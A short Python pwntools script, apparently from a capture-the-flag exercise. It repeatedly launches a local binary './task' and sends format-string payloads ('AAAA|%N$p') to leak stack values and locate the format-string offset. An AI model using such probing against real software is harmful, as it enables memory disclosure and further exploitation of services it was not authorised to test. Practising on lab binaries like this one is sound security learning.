from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'error'

for i in range(1, 201):
    try:
        p = process()

        p.sendlineafter(':\n', 'AAAA|%{}$p'.format(i).encode())
        resp = p.recvline().decode()

        print(str(i) + ': ' + resp.strip())

    except EOFError:
        pass
